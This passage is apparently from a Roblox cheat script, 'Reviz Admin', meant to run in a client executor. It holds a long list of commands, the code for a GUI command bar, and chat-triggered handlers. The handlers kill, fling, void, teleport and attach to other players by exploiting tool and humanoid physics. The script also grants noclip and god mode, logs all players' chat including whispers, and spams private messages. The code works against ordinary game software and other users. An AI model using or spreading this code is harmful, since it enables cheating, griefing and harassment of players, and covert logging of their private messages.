    '[60] cmds -- Prints all commands',
    '[61] rmeshhats/blockhats -- Removes the meshes of all your accessories aka block hats',
    '[62] rmeshtool/blocktool -- Removes the mesh of the tool you have equipped aka block tool',
    '[63] spinner -- Makes you spin',
    '[64] nospinner',
    '[65] reach [num] -- Gives you reach, mostly used for swords, say ;reachd for default and enter number after for custom',
    '[66] noreach -- Removes reach, must have tool equipped',
    '[67] rkill [plr] -- Kills you and the player, use kill to just kill the player without dying',
    '[68] tp me [plr] -- Alternative to goto',
    '[69] cbring [plr] -- Brings player infront of you, shows only on client, allows you to do damage to player',
    '[70] uncbring',
    '[71] swap [plr] -- You need a tool! Swaps players position with yours and your position with players',
    '[72] givetool [plr] -- Gives the tool you have equipped to the player',
    '[73] glitch [plr] -- Glitches you and the player, looks very cool',
    '[74] unglitch -- Unglitches you',
    '[75] grespawn -- Alternative to normal respawn and usually works best for when you want to reset with FE Godmode',
    '[76] explorer -- Loads up DEX',
    '[77] reset -- Resets your character.',
    '[78] anim [id] -- Applies an animation on you, must be created by ROBLOX',
    '[79] animgui -- Loads up Energize animations GUI',
    '[80] savepos -- Saves your current position',
    '[81] loadpos -- Teleports you to your saved position',
    '[82] bang [plr] -- 18+ will not work if you have FE Godmode on',
    '[83] unbang',
    '[84] delcmdbar -- Removes the command bar completely',
    '[85] bringmod [obj] -- Brings all the parts in a model, client only, comes from ;bringobj enter exact name of model',
    '[86] shutdown -- Uses harkinians script to shutdown server',
    '[87] respawn -- If grespawn doesnt work you can use respawn',
    '[88] delobj [obj] -- Deletes a certain brick in workspace, client sided',
    '[89] getplrs -- Prints all players in game',
    '[90] deldecal -- Deletes all decals client sided',
    '[91] opfinality -- Loads in my FE GUI Opfinality',
    '[92] remotes -- Prints all remotes in the game in the console when added',
    '[93] noremotes -- Stops printing remotes',
    '[94] tpdefault -- Stops all loop teleports to a player',
    '[95] stopsit -- Will not allow you to sit',
    '[96] gosit -- Allows you to sit',
    '[97] clicktp -- Enables click tp',
    '[98] noclicktp -- Disables click tp',
    '[99] toolson -- If any tools are dropped in the workspace you will automatically get them',
    '[100] toolsoff -- Stops ;toolson',
    '[101] version -- Gets the admin version',
    '[102] state [num] -- Changes your humanoid state, ;unstate to stop.',
    '[103] gravity [num] -- Changes workspace gravity default is 196.2',
    '[104] pgs -- Checks if the game has PGSPhysicsSolverEnabled enabled',
    '[105] clickdel -- Delete any block you press q on, client sided',
    '[106] noclickdel -- Stops clickdel',
    '[107] looprhats -- Loop removes mesh of your hats/loop block hats',
    '[108] unlooprhats -- Stops loop removing mesh',
    '[109] looprtool -- Loop removes mesh of your tool/loop block tools',
    '[110] unlooprtool -- Stops loop removing mesh',
    '[111] givealltools [plr] -- Gives all the tools you have in your backpack to the player',
    '[112] age [plr] -- Makes you chat the account age of the player',
    '[113] id [plr] -- Makes you chat the account ID of the player',
    '[114] .age [plr] -- Privately shows you the account age of the player',
    '[115] .id [plr] -- Privately shows you the account ID of the player',
    '[116] gameid -- Shows the game ID',
    '[117] removeinvis -- Removes all invisible walls/parts, client sided',
    '[118] removefog -- Removes fog, client sided',
    '[119] disable -- Disables your character by removing humanoid',
    '[120] enable -- Enables your character by adding humanoid',
    '[121] prefix [key] -- Changes the prefix used, default is ;',
    '[122] ;resetprefix -- Resets the prefix to ; incase you change it to an unusable prefix. Say exactly ";resetprefix" to do this command, no matter what your prefix is set to.',
    '[123] flyspeed [num] -- Change your fly speed, default is 1',
    '[124] carpet [plr] -- Makes you a carpet for a player, will not work if FE Godmode is on',
    '[125] uncarpet -- Stops carpet player',
    '[126] stare [plr] -- Turns your character to stare at another player',
    '[127] unstare -- Stops stare player',
    '[128] logchat -- Logs all chat (including /e and whispers) of all players',
    '[129] unlogchat -- Disables logchat',
    '[130] fixcam -- Fixes/resets your camera',
    '[131] unstate -- Stops changing state',
}
speedget = 1
 
lplayer = game:GetService("Players").LocalPlayer
 
lplayer.CharacterAdded:Connect(function(character)
    spin = false
    flying = false
    staring = false
    banpl = false
end)
 
function change()
    prefix = prefix
    speedfly = speedfly
end
 
function GetPlayer(String) -- Credit to Timeless/xFunnieuss
    local Found = {}
    local strl = String:lower()
    if strl == "all" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            table.insert(Found,v)
        end
    elseif strl == "others" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name ~= lplayer.Name then
                table.insert(Found,v)
            end
        end  
    elseif strl == "me" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name == lplayer.Name then
                table.insert(Found,v)
            end
        end  
    else
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1, #String) == String:lower() then
                table.insert(Found,v)
            end
        end    
    end
    return Found    
end
 
local Mouse = lplayer:GetMouse()
 
spin = false
followed = false
traill = false
noclip = false
annoying = false
hwalk = false
droppinghats = false
droppingtools = false
flying = false
spamdelay = 1
spamming = false
spammingpm = false
cbringing = false
remotes = true
added = true
binds = false
stopsitting = false
clickgoto = false
gettingtools = false
removingmeshhats = false
removingmeshtool = false
clickdel = false
staring = false
chatlogs = false
banpl = false
changingstate = false
statechosen = 0
 
adminversion = "Reviz Admin by illremember, Version 2.0"
 
flying = false
speedfly = 1
 
function plrchat(plr, chat)
print(plr.Name..": "..tick().."\n"..chat)
end
 
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
v.Chatted:connect(function(chat)
if chatlogs then
plrchat(v, chat)
end
end)
end
game:GetService("Players").PlayerAdded:connect(function(plr)
plr.Chatted:connect(function(chat)
if chatlogs then
plrchat(plr, chat)
end
end)
end)
 
 
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local CMDBAR = Instance.new("TextBox")
ScreenGui.Parent = game:GetService("CoreGui")
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(0.3, 0.1, 0.1)
Frame.BackgroundTransparency = 0.3
Frame.Position = UDim2.new(0.5, 0, 0, 10)
Frame.Size = UDim2.new(0, 200, 0, 40)
Frame.Active = true
Frame.Draggable = true
CMDBAR.Name = "CMDBAR"
CMDBAR.Parent = Frame
CMDBAR.BackgroundColor3 = Color3.new(0.105882, 0.164706, 0.207843)
CMDBAR.BackgroundTransparency = 0.20000000298023
CMDBAR.Size = UDim2.new(0, 180, 0, 20)
CMDBAR.Position = UDim2.new(0.05, 0, 0.25, 0)
CMDBAR.Font = Enum.Font.SourceSansLight
CMDBAR.FontSize = Enum.FontSize.Size14
CMDBAR.TextColor3 = Color3.new(0.945098, 0.945098, 0.945098)
CMDBAR.TextScaled = true
CMDBAR.TextSize = 14
CMDBAR.TextWrapped = true
CMDBAR.Text = "Press ; to type, Enter to execute"
 
local CMDS = Instance.new("ScreenGui")
local CMDSFRAME = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local TextLabel = Instance.new("TextLabel")
local closegui = Instance.new("TextButton")
CMDS.Name = "CMDS"
CMDS.Parent = game:GetService("CoreGui")
CMDSFRAME.Name = "CMDSFRAME"
CMDSFRAME.Parent = CMDS
CMDSFRAME.Active = true
CMDSFRAME.BackgroundColor3 = Color3.new(0.223529, 0.231373, 0.309804)
CMDSFRAME.BorderSizePixel = 0
CMDSFRAME.Draggable = true
CMDSFRAME.Position = UDim2.new(0, 315, 0, 100)
CMDSFRAME.Size = UDim2.new(0, 275, 0, 275)
CMDSFRAME.Visible = false
ScrollingFrame.Parent = CMDSFRAME
ScrollingFrame.BackgroundColor3 = Color3.new(0.160784, 0.160784, 0.203922)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0.0729999989, 0)
ScrollingFrame.Size = UDim2.new(1.04999995, 0, 0.92900002, 0)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 10, 0)
TextLabel.Parent = ScrollingFrame
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.Size = UDim2.new(0.930000007, 0, 1, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.FontSize = Enum.FontSize.Size18
TextLabel.Text = "[-] cmdbar is shown when ; is pressed.,\n[1] kill [plr] -- You need a tool! Will kill the player, use rkill to kill you and player,\n[2] bring [plr] -- You need a tool! Will bring player to you,\n[3] spin [plr] -- You need a tool! Makes you and the player spin crazy,\n[4] unspin -- Use after using spin cmd and dying, so you stop loop teleporting,\n[5] attach [plr] -- You need a tool! Attaches you to player,\n[6] unattach [plr] -- Attempts to unattach you from a player,\n[7] follow [plr] -- Makes you follow behind the player,\n[8] unfollow,\n[9] freefall [plr] -- You need a tool! Teleports you and the player up into the air,\n[10] trail [plr] -- The opposite of follow, you stay infront of player,\n[11] untrail,\n[12] orbit [plr] -- Makes you orbit the player,\n[13] unorbit,\n[14] fling [plr] -- Makes you fling the player,\n[15] unfling,\n[16] fecheck -- Checks if the game is FE or not,\n[17] void [plr] -- Teleports player to the void,\n[18] noclip -- Gives you noclip to walk through walls,\n[19] clip -- Removes noclip,\n[20] speed [num]/ws [num] -- Changes how fast you walk 16 is default,\n[21] jumppower [num]/jp [num] -- Changes how high you jump 50 is default,\n[22] hipheight [num]/hh [num] -- Changes how high you float 0 is default,\n[23] default -- Changes your speed, jumppower and hipheight to default values,\n[24] annoy [plr] -- Loop teleports you to the player,\n[25] unannoy,\n[26] headwalk [plr] -- Loop teleports you to the player head,\n[27] unheadwalk,\n[28] nolimbs -- Removes your arms and legs,\n[29] god -- Gives you FE Godmode,\n[30] drophats -- Drops your accessories,\n[31] droptool -- Drops any tool you have equipped,\n[32] loopdhats -- Loop drops your accessories,\n[33] unloopdhats,\n[34] loopdtool -- Loop drops any tools you have equipped,\n[35] unloopdtool,\n[36] invisible -- Gives you invisibility CREDIT TO TIMELESS,\n[37] view [plr] -- Changes your camera to the player character,\n[38] unview,\n[39] goto [plr] -- Teleports you to player,\n[40] fly -- Allows you to fly,\n[41] unfly,\n[42] chat [msg] -- Makes you chat a message,\n[43] spam [msg] -- Spams a message,\n[44] unspam,\n[45] spamwait [num] -- Changes delay of chatting a message for the spam command in seconds default is 1 second,\n[46] pmspam [plr] -- Spams a player in private message,\n[47] unpmspam,\n[48] cfreeze [plr] -- Freezes a player on your client, they will only be frozen for you,\n[49] uncfreeze [plr],\n[50] unlockws -- Unlocks the workspace,\n[51] lockws -- Locks the workspace,\n[52] btools -- Gives you btools that will only show to you useful for deleting certain blocks only for you,\n[53] pstand -- Enables platform stand,\n[54] unpstand -- Disables platform stand,\n[55] blockhead -- Removes your head mesh,\n[56] sit,\n[57] bringobj [obj] -- Only shows on client, brings an object/part to you constantly, can be used to bring healing parts, weapons, money etc, type in exact name,\n[58] wsvis [num] -- Changes visibility of workspace parts, num should be between 0 and 1, only shows client sided,\n[59] hypertotal -- Loads in my FE GUI Hypertotal,\n[60] cmds -- Prints all commands,\n[61] rmeshhats/blockhats -- Removes the meshes of all your accessories aka block hats,\n[62] rmeshtool/blocktool -- Removes the mesh of the tool you have equipped aka block tool,\n[63] spinner -- Makes you spin,\n[64] nospinner,\n[65] reach [num] -- Gives you reach, mostly used for swords, say ;reachd for default and enter number after for custom,\n[66] noreach -- Removes reach, must have tool equipped,\n[67] rkill [plr] -- Kills you and the player, use kill to just kill the player without dying,\n[68] tp me [plr] -- Alternative to goto,\n[69] cbring [plr] -- Brings player infront of you, shows only on client, allows you to do damage to player,\n[70] uncbring,\n[71] swap [plr] -- You need a tool! Swaps players position with yours and your position with players,\n[72] givetool [plr] -- Gives the tool you have equipped to the player,\n[73] glitch [plr] -- Glitches you and the player, looks very cool,\n[74] unglitch -- Unglitches you,\n[75] grespawn -- Alternative to normal respawn and usually works best for when you want to reset with FE Godmode,\n[76] explorer -- Loads up DEX,\n[77] reset -- Resets your character.,\n[78] anim [id] -- Applies an animation on you, must be created by ROBLOX,\n[79] animgui -- Loads up Energize animations GUI,\n[80] savepos -- Saves your current position,\n[81] loadpos -- Teleports you to your saved position,\n[82] bang [plr] -- 18+,\n[83] unbang,\n[84] delcmdbar -- Removes the command bar completely,\n[85] bringmod [obj] -- Brings all the parts in a model, client only, comes from ;bringobj enter exact name of model,\n[86] shutdown -- Uses harkinians script to shutdown server,\n[87] respawn -- If grespawn doesnt work you can use respawn,\n[88] delobj [obj] -- Deletes a certain brick in workspace, client sided,\n[89] getplrs -- Prints all players in game,\n[90] deldecal -- Deletes all decals client sided,\n[91] opfinality -- Loads in my FE GUI Opfinality,\n[92] remotes -- Prints all remotes in the game in the console when added,\n[93] noremotes -- Stops printing remotes,\n[94] tpdefault -- Stops all loop teleports to a player,\n[95] stopsit -- Will not allow you to sit,\n[96] gosit -- Allows you to sit,\n[97] clicktp -- Enables click tp,\n[98] noclicktp -- Disables click tp,\n[99] toolson -- If any tools are dropped in the workspace you will automatically get them,\n[100] toolsoff -- Stops ;toolson,\n[101] version -- Gets the admin version, \n This list of commands is NOT showing everything, go to my thread in the pastebin link to see ALL commands."
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextSize = 15
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextLabel.TextYAlignment = Enum.TextYAlignment.Top
closegui.Name = "closegui"
closegui.Parent = CMDSFRAME
closegui.BackgroundColor3 = Color3.new(0.890196, 0.223529, 0.0588235)
closegui.BorderSizePixel = 0
closegui.Position = UDim2.new(0.995000005, 0, 0, 0)
closegui.Size = UDim2.new(0.0545952693, 0, 0.0728644878, 0)
closegui.Font = Enum.Font.SourceSansBold
closegui.FontSize = Enum.FontSize.Size24
closegui.Text = "X"
closegui.TextColor3 = Color3.new(1, 1, 1)
closegui.TextSize = 20
 
closegui.MouseButton1Click:connect(function()
    CMDSFRAME.Visible = false
end)
 
game:GetService('RunService').Stepped:connect(function()
    if spin then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[spinplr.Name].Character.HumanoidRootPart.CFrame
    end
    if followed then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[flwplr.Name].Character.HumanoidRootPart.CFrame + game:GetService("Players")[flwplr.Name].Character.HumanoidRootPart.CFrame.lookVector * -5
    end
    if traill then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[trlplr.Name].Character.HumanoidRootPart.CFrame + game:GetService("Players")[trlplr.Name].Character.HumanoidRootPart.CFrame.lookVector * 5
    end
    if annoying then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[annplr.Name].Character.HumanoidRootPart.CFrame
    end
    if hwalk then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[hdwplr.Name].Character.HumanoidRootPart.CFrame + Vector3.new(0, 4, 0)
    end
    if staring then
        lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(lplayer.Character.Torso.Position, game:GetService("Players")[stareplr.Name].Character.Torso.Position)
    end
end)
game:GetService('RunService').Stepped:connect(function()
    if noclip then
        if lplayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
            lplayer.Character.Head.CanCollide = false
            lplayer.Character.Torso.CanCollide = false
            lplayer.Character["Left Leg"].CanCollide = false
            lplayer.Character["Right Leg"].CanCollide = false
        else
            lplayer.Character.Humanoid:ChangeState(11)
        end
    end
    if changingstate then
        lplayer.Character.Humanoid:ChangeState(statechosen)
    end
end)
game:GetService('RunService').Stepped:connect(function()
    if droppinghats then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Parent = workspace
            end
        end
    end
    if droppingtools then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Parent = workspace
            end
        end
    end
    if removingmeshhats then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if removingmeshtool then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
end)
game:GetService('RunService').Stepped:connect(function()
    if banpl then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[bplrr].Character.HumanoidRootPart.CFrame
    end
end)
game:GetService('RunService').Stepped:connect(function()
    if stopsitting then
        lplayer.Character.Humanoid.Sit = false
    end
end)
 
plr = lplayer
hum = plr.Character.HumanoidRootPart
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
    if key == "e" then
        if mouse.Target then
            if clickgoto then
                hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
            elseif clickdel then
                mouse.Target:Destroy()
            end
        end
    end
end)
 
game:GetService("Workspace").ChildAdded:connect(function(part)
    if gettingtools then
        if part:IsA("Tool") then
            part.Handle.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        end
    end
end)
 
lplayer.Chatted:Connect(function(msg)
    if string.sub(msg, 1, 6) == (prefix.."kill ") then
        if string.sub(msg, 7) == "me" then
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(100000,0,100000)
        else
            for i,v in pairs(GetPlayer(string.sub(msg, 7)))do
                local NOW = lplayer.Character.HumanoidRootPart.CFrame
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                local function tp(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1:MoveTo(char2.Head.Position)
                end
                end
                wait(0.1)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.5)
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
                wait(0.7)
                tp(lplayer,game:GetService("Players")[v.Name])
                wait(0.7)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."bring ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8)))do
            local NOW = lplayer.Character.HumanoidRootPart.CFrame
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            local function tp(player,player2)
            local char1,char2=player.Character,player2.Character
            if char1 and char2 then
            char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
            end
            end
            local function getout(player,player2)
            local char1,char2=player.Character,player2.Character
            if char1 and char2 then
            char1:MoveTo(char2.Head.Position)
            end
            end
            tp(game:GetService("Players")[v.Name], lplayer)
            wait(0.2)
            tp(game:GetService("Players")[v.Name], lplayer)
            wait(0.5)
            lplayer.Character.HumanoidRootPart.CFrame = NOW
            wait(0.5)
            getout(lplayer, game:GetService("Players")[v.Name])
            wait(0.3)
            lplayer.Character.HumanoidRootPart.CFrame = NOW
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 6) == (prefix.."spin ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            lplayer.Character.Animate.Disabled = false
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            spinplr = v
            wait(0.5)
            spin = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."unspin") then
        spin = false
    end
    if string.sub(msg, 1, 8) == (prefix.."attach ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            wait(0.3)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            attplr = v
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."unattach ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
            local function getout(player,player2)
            local char1,char2=player.Character,player2.Character
            if char1 and char2 then
            char1:MoveTo(char2.Head.Position)
            end
            end
            getout(lplayer, game:GetService("Players")[v.Name])
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."follow ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            followed = true
            flwplr = v
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."unfollow") then
        followed = false
    end
    if string.sub(msg, 1, 10) == (prefix.."freefall ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
            local NOW = lplayer.Character.HumanoidRootPart.CFrame
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.2)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.6)
            lplayer.Character.HumanoidRootPart.CFrame = NOW
            wait(0.6)
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."trail ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
            traill = true
            trlplr = v
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."untrail") then
        traill = false
    end
    if string.sub(msg, 1, 7) == (prefix.."orbit ") then
        if string.sub(msg, 8) == "all" or string.sub(msg, 8) == "others" or string.sub(msg, 8) == "me" then
            lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        else
            for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
                local o = Instance.new("RocketPropulsion")
                o.Parent = lplayer.Character.HumanoidRootPart
                o.Name = "Orbit"
                o.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
                o:Fire()
                noclip = true
            end
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."unorbit") then
        lplayer.Character.HumanoidRootPart.Orbit:Destroy()
        noclip = false
    end
    if string.sub(msg, 1, 7) == (prefix.."fling ") then
        if string.sub(msg, 8) == "all" or string.sub(msg, 8) == "others" or string.sub(msg, 8) == "me" then
            lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        else
            for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
                local y = Instance.new("RocketPropulsion")
                y.Parent = lplayer.Character.HumanoidRootPart
                y.CartoonFactor = 1
                y.MaxThrust = 800000
                y.MaxSpeed = 1000
                y.ThrustP = 200000
                y.Name = "Fling"
                game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
                y.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
                y:Fire()
                noclip = true
            end
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."unfling") then
        noclip = false
        lplayer.Character.HumanoidRootPart.Fling:Destroy()
        game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
        wait(0.4)
        lplayer.Character.HumanoidRootPart.Fling:Destroy()
    end
    if string.sub(msg, 1, 8) == (prefix.."fecheck") then
        if game:GetService("Workspace").FilteringEnabled == true then
            warn("FE is Enabled (Filtering Enabled)")
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "FE is Enabled";
                Text = "Filtering Enabled. Enjoy using Reviz Admin!";
            })
        else
            warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "FE is Disabled";
                Text = "Filtering Disabled. Consider using a different admin script.";
            })
        end
    end
    if string.sub(msg, 1, 6) == (prefix.."void ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.2)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.6)
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999999999,0,999999999999999)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."noclip") then
        noclip = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Noclip enabled";
        Text = "Type ;clip to disable";
        })
    end
    if string.sub(msg, 1, 5) == (prefix.."clip") then
        noclip = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Noclip disabled";
        Text = "Type ;noclip to enable";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."speed ") then
        lplayer.Character.Humanoid.WalkSpeed = (string.sub(msg, 8))
    end
    if string.sub(msg, 1, 4) == (prefix.."ws ") then
        lplayer.Character.Humanoid.WalkSpeed = (string.sub(msg, 5))
    end
    if string.sub(msg, 1, 11) == (prefix.."hipheight ") then
        lplayer.Character.Humanoid.HipHeight = (string.sub(msg, 12))
    end
    if string.sub(msg, 1, 4) == (prefix.."hh ") then
        lplayer.Character.Humanoid.HipHeight = (string.sub(msg, 5))
    end
    if string.sub(msg, 1, 11) == (prefix.."jumppower ") then
        lplayer.Character.Humanoid.JumpPower = (string.sub(msg, 12))
    end
    if string.sub(msg, 1, 4) == (prefix.."jp ") then
        lplayer.Character.Humanoid.JumpPower = (string.sub(msg, 5))
    end
    if string.sub(msg, 1, 8) == (prefix.."default") then
        lplayer.Character.Humanoid.JumpPower = 50
        lplayer.Character.Humanoid.WalkSpeed = 16
        lplayer.Character.Humanoid.HipHeight = 0
    end
    if string.sub(msg, 1, 7) == (prefix.."annoy ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
            annoying = true
            annplr = v
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."unannoy") then
        annoying = false
    end
    if string.sub(msg, 1, 10) == (prefix.."headwalk ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
            hwalk = true
            hdwplr = v
        end
    end
    if string.sub(msg, 1, 11) == (prefix.."unheadwalk") then
        hwalk = false
    end
    if string.sub(msg, 1, 8) == (prefix.."nolimbs") then
        lplayer.Character["Left Leg"]:Destroy()
        lplayer.Character["Left Arm"]:Destroy()
